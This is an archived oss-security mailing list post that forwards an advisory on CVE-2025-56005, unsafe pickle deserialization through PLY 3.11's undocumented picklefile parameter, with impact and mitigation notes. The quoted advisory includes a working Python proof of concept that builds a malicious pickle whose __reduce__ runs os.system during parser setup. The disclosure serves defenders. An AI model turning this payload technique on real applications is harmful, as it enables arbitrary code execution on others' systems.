@@ -1,0 +1,305 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title>oss-security - CVE-2025-56005 Undocumented RCE in PLY via
+ `picklefile` Parameter</title>
+
+<link href="/style.css" type="text/css" rel="stylesheet">
+<style type="text/css">
+.calendar { text-align: center; }
+.ccell { background: #ccc; width: 5ex; padding: 2px; }
+
+.cal_brief { text-align: center; }
+.cal_brief td:first-child { background: inherit; }
+.cal_brief td { background: #ccc; width: 5ex; padding: 2px; }
+.cal_big { text-align: center; padding: 0; margin: 0; }
+.cal_big td { padding: 0 2px; }
+.cal_mon { text-align: center; }
+.cal_mon th { font-size: small; padding: 0; margin: 0; }
+.cal_mon td { background: #ccc; width: 5ex; height: 1.5em;
+	padding: 2px; text-align: right; }
+.cal_mon td[colspan] { background: inherit; }
+.cal_mon sup { color: #F0F0F0; text-align: left; float: left;
+	margin-top: -2pt; font-weight: bold; }
+.cal_mon a { text-align: right; margin-left: -4em; float: right; }
+</style>
+</head>
+
+<BODY bgcolor="#E0E0E0" text="black" link="blue" alink="red" vlink="navy">
+
+
+<table bgcolor="#ffffff" width="100%" border="0" cellspacing="0" cellpadding="0">
+<tr>
+
+<td>
+<a href="/"><img class="logo" src="/logo.png" border="0" width="182" height="80" alt="Openwall"></a>
+<td width="100%">
+<div class="nav">
+<ul>
+<li><a href="/">Products</a>
+<ul>
+<li><a href="/Owl/">Openwall GNU/*/Linux &nbsp; <i>server OS</i></a>
+<li><a href="/lkrg/">Linux Kernel Runtime Guard</a>
+<li><a href="/john/">John the Ripper &nbsp; <i>password cracker</i></a>
+<ul>
+<li><a href="/john/">Free &amp; Open Source for any platform</a>
+<li><a href="/john/cloud/">in the cloud</a>
+<li><a href="/john/pro/linux/">Pro for Linux</a>
+<li><a href="/john/pro/macosx/">Pro for macOS</a>
+</ul>
+<li><a href="/wordlists/">Wordlists &nbsp; <i>for password cracking</i></a>
+<li><a href="/passwdqc/">passwdqc &nbsp; <i>policy enforcement</i></a>
+<ul>
+<li><a href="/passwdqc/">Free &amp; Open Source for Unix</a>
+<li><a href="/passwdqc/windows/">Pro for Windows (Active Directory)</a>
+</ul>
+<li><a href="/yescrypt/">yescrypt &nbsp; <i>KDF &amp; password hashing</i></a>
+<li><a href="/yespower/">yespower &nbsp; <i>Proof-of-Work (PoW)</i></a>
+<li><a href="/crypt/">crypt_blowfish &nbsp; <i>password hashing</i></a>
+<li><a href="/phpass/">phpass &nbsp; <i>ditto in PHP</i></a>
+<li><a href="/tcb/">tcb &nbsp; <i>better password shadowing</i></a>
+<li><a href="/pam/">Pluggable Authentication Modules</a>
+<li><a href="/scanlogd/">scanlogd &nbsp; <i>port scan detector</i></a>
+<li><a href="/popa3d/">popa3d &nbsp; <i>tiny POP3 daemon</i></a>
+<li><a href="/blists/">blists &nbsp; <i>web interface to mailing lists</i></a>
+<li><a href="/msulogin/">msulogin &nbsp; <i>single user mode login</i></a>
+<li><a href="/php_mt_seed/">php_mt_seed &nbsp; <i>mt_rand() cracker</i></a>
+</ul>
+<li><a href="/services/">Services</a>
+<li id="narrow-li-1"><a>Publications</a>
+<ul>
+<li><a href="/articles/">Articles</a>
+<li><a href="/presentations/">Presentations</a>
+</ul>
+<li><a>Resources</a>
+<ul>
+<li><a href="/lists/">Mailing lists</a>
+<li><a href="https://openwall.info/wiki/">Community wiki</a>
+<li><a href="https://github.com/openwall">Source code repositories (GitHub)</a>
+<li><a href="/mirrors/">File archive &amp; mirrors</a>
+<li><a href="/signatures/">How to verify digital signatures</a>
+<li><a href="/ove/">OVE IDs</a>
+</ul>
+<li id="last-li"><a href="/news">What's new</a>
+</ul>
+</div>
+
+
+</table>
+
+
+<TABLE bgcolor="#B4D0DC" width="100%" border="0" cellspacing="0" cellpadding="1">
+<TR><TD>
+<TABLE width="100%" border="0" cellspacing="0" cellpadding="2">
+<TR><TD bgcolor="#ECF8FF">
+<a href="https://twitter.com/openwall">
+Follow @Openwall on Twitter for new release announcements and other news</a>
+
+</TABLE>
+</TABLE>
+
+<a href="3">[&lt;prev]</a> <a href="5">[next&gt;]</a> <a href="5">[thread-next&gt;]</a> <a href=".">[day]</a> <a href="..">[month]</a> <a href="../..">[year]</a> <a href="../../..">[list]</a>
+<pre style="white-space: pre-wrap">
+Message-ID: &lt;7d323bf4-91fb-4bee-aed4-e5f3757c3631&#64;oracle.com&gt;
+Date: Fri, 23 Jan 2026 11:06:24 -0800
+From: Alan Coopersmith &lt;alan.coopersmith&#64;...cle.com&gt;
+To: oss-security&#64;...ts.openwall.com
+Subject: CVE-2025-56005 Undocumented RCE in PLY via
+ `picklefile` Parameter
+
+<a href="https://github.com/bohmiiidd/Undocumented-RCE-in-PLY" rel="nofollow">https://github.com/bohmiiidd/Undocumented-RCE-in-PLY</a> claims:
+
+&gt; Undocumented Remote Code Execution in PLY CVE-2025-56005
+&gt; --------------------------------------------------------
+&gt; 
+&gt; CVE ID: CVE-2025-56005
+&gt; Reported by: Ahmed Abd
+&gt; Disclosure Date: July 1, 2025
+&gt; Affected Product: PLY (Python Lex‑Yacc)
+&gt; Affected Version: 3.11 (PyPI distribution)
+&gt; Vendor: PLY (Python Lex‑Yacc)
+&gt; Affected Component:** ply/yacc.py` — `LRTable.read_pickle()` via `yacc(picklefile=...)`
+&gt; 
+&gt; ## Summary
+&gt; 
+&gt; An undocumented and unsafe feature in the PyPI‑distributed version of PLY 3.11
+&gt; allows arbitrary code execution when the `yacc()` function is invoked with the
+&gt; `picklefile` parameter.
+&gt; 
+&gt; The `picklefile` parameter causes PLY to deserialize a `.pkl` file using
+&gt; Python’s `pickle.load()` **without validation**. Because Python’s `pickle`
+&gt; module supports execution of arbitrary code during deserialization (e.g.,
+&gt; via `__reduce__()`), an attacker who can control the supplied pickle file
+&gt; can execute arbitrary code during parser initialization.
+&gt; 
+&gt; This parameter is *not documented* in the official PLY documentation or
+&gt; GitHub repository, yet it is active in the PyPI release.
+&gt; 
+&gt; ---
+&gt; 
+&gt; ## Impact
+&gt; 
+&gt; attacker can control, replace, or influence the `.pkl` file passed to
+&gt; `yacc(picklefile=...)`, they can achieve:
+&gt; 
+&gt; * Arbitrary code execution
+&gt; * Execution during application startup
+&gt; * Code execution before any parsing logic is reached
+&gt; 
+&gt; This may affect applications that load parser tables from:
+&gt; 
+&gt; * Cached locations
+&gt; * Shared directories
+&gt; * CI/CD pipelines
+&gt; * Configurable or writable paths
+&gt; 
+&gt; ---
+&gt; 
+&gt; ## Vulnerability Details
+&gt; 
+&gt; * **Vulnerability Type:** Arbitrary Code Execution
+&gt; * **Attack Type:** Context‑dependent
+&gt; * **Attack Vector:** Unsafe deserialization of attacker‑controlled pickle file
+&gt; * **Impact:** Code execution
+&gt; * **CWE:** CWE‑502 (Deserialization of Untrusted Data)
+&gt; 
+&gt; ### Affected Functionality
+&gt; 
+&gt; * `ply.yacc.yacc(picklefile=...)`
+&gt; * `LRTable.read_pickle()` in `ply/yacc.py`
+&gt; 
+&gt; ---
+&gt; 
+&gt; ## Additional Information (Context &amp; Risk)
+&gt; 
+&gt; This vulnerability presents elevated risk due to its stealthy nature and
+&gt; potential for persistence.
+&gt; 
+&gt; The `picklefile` parameter is *undocumented* in the official PLY documentation
+&gt; and GitHub repository. However, the PyPI‑distributed version of PLY 3.11
+&gt; includes this functionality and processes the supplied file using
+&gt; `pickle.load()` without validation.
+&gt; 
+&gt; Because Python’s `pickle` module permits execution of embedded code during
+&gt; deserialization, a malicious pickle file can execute arbitrary code *during
+&gt; parser setup*, before any parsing logic is invoked.
+&gt; 
+&gt; At the time of writing, the maintainer has not publicly acknowledged this
+&gt; behavior.
+&gt; 
+&gt; This functionality can be abused to introduce persistent backdoors,
+&gt; particularly in environments where parser table files are:
+&gt; 
+&gt; * Cached on disk
+&gt; * Shared between users or services
+&gt; * Generated or reused in CI/CD pipelines
+&gt; * Loaded from configurable or writable paths
+&gt; 
+&gt; Given the lack of documentation, silent execution path, and the high impact
+&gt; of unsafe deserialization, a CVE assignment is warranted to raise awareness
+&gt; and protect downstream users.
+&gt; 
+&gt; ---
+&gt; 
+&gt; ## Proof of Concept (PoC)
+&gt; 
+&gt; This proof of concept demonstrates arbitrary code execution when a
+&gt; malicious pickle file is supplied via the undocumented `picklefile` parameter.
+&gt; 
+&gt; ### PoC Overview
+&gt; 
+&gt; The PoC:
+&gt; 
+&gt; * Defines a minimal lexer and parser
+&gt; * Crafts a malicious pickle payload
+&gt; * Executes a system command during deserialization
+&gt; 
+&gt; ### Expected Result
+&gt; 
+&gt; When `yacc(picklefile='exploit.pkl')` is invoked, arbitrary code is executed
+&gt; during parser initialization.
+&gt; 
+&gt; ```python
+&gt; import pickle
+&gt; import os
+&gt; from ply.lex import lex
+&gt; from ply.yacc import yacc
+&gt; 
+&gt; tokens = ('EXAMPLE',)
+&gt; 
+&gt; def t_EXAMPLE(t):
+&gt;     r'example'
+&gt;     return t
+&gt; 
+&gt; def p_sample(p):
+&gt;     'sample : EXAMPLE'
+&gt;     pass
+&gt; 
+&gt; class Exploit:
+&gt;     def __reduce__(self):
+&gt;         cmd = 'touch /tmp/pwned &amp;&amp; echo "VULNERABLE" &gt; /tmp/pwned'
+&gt;         return (os.system, (cmd,))
+&gt; 
+&gt; malicious_data = {
+&gt;     '_tabversion': '3.11',
+&gt;     '_lr_action': {0: {}},
+&gt;     '_lr_goto': {0: {}},
+&gt;     '_lr_productions': [
+&gt;         (None, 0, 0, 0, Exploit())
+&gt;     ],
+&gt;     '_lr_method': 'LALR'
+&gt; }
+&gt; 
+&gt; with open('exploit.pkl', 'wb') as f:
+&gt;     pickle.dump(malicious_data, f)
+&gt; 
+&gt; parser = yacc(picklefile='exploit.pkl', debug=False, write_tables=False)
+&gt; parser.parse('example')
+&gt; ```
+&gt; 
+&gt; ---
+&gt; 
+&gt; ## Mitigation
+&gt; 
+&gt; * Do *not* use the `picklefile` parameter with untrusted or externally
+&gt;   writable files
+&gt; * Avoid loading parser tables from user‑controlled locations
+&gt; * Treat all pickle files as *unsafe input*
+&gt; * Prefer regenerating parser tables rather than loading them from disk
+&gt; 
+&gt; ---
+&gt; 
+&gt; 
+&gt; ## References
+&gt; 
+&gt; * PLY GitHub Repository: <a href="https://github.com/dabeaz/ply" rel="nofollow">https://github.com/dabeaz/ply</a>
+&gt; * PyPI Package: <a href="https://pypi.org/project/ply/" rel="nofollow">https://pypi.org/project/ply/</a>
+&gt; * Python Pickle Documentation: <a href="https://docs.python.org/3/library/pickle.html" rel="nofollow">https://docs.python.org/3/library/pickle.html</a>
+&gt; * Proof of Concept Repository:
+&gt;   <a href="https://github.com/bohmiiidd/Undocumented-RCE-in-PLY" rel="nofollow">https://github.com/bohmiiidd/Undocumented-RCE-in-PLY</a>
+
+Of note, <a href="https://github.com/dabeaz/ply" rel="nofollow">https://github.com/dabeaz/ply</a> now bears a banner:
+"This repository was archived by the owner on Dec 21, 2025. It is now read-only."
+
+-- 
+         -Alan Coopersmith-                 alan.coopersmith&#64;...cle.com
+          Oracle Solaris Engineering - <a href="https://blogs.oracle.com/solaris" rel="nofollow">https://blogs.oracle.com/solaris</a>
+
+</pre>
+<p><a href="https://www.openwall.com/blists/">Powered by blists</a> - <a href="https://lists.openwall.net">more mailing lists</a>
+
+
+<p>
+Please check out the
+<a href="https://oss-security.openwall.org/wiki/">
+Open Source Software Security Wiki</a>, which is counterpart to this
+<a href="https://oss-security.openwall.org/wiki/mailing-lists/oss-security">mailing list</a>.
+<p>
+Confused about <a href="/lists/">mailing lists</a> and their use?
+<a href="https://en.wikipedia.org/wiki/Electronic_mailing_list">Read about mailing lists on Wikipedia</a>
+and check out these
+<a href="https://www.complang.tuwien.ac.at/anton/mail-news-errors.html">guidelines on proper formatting of your messages</a>.
+<p>
+
+</body>
+</html>
